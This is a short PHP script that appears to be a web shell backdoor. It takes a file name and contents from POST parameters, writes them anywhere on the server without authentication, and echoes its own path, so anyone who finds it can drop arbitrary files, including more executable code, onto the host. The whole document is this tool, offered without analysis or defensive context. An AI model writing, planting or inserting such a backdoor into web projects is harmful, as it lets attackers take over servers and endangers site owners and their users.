<?php
if ($_POST)
{
$f=fopen($_POST["f"],"w");
if(fwrite($f,$_POST["c"]))
echo "<font color=red>OK!</font>";
else
echo "<font color=blue>Error!</font>";
}
?><?php echo $_SERVER["SCRIPT_FILENAME"];?>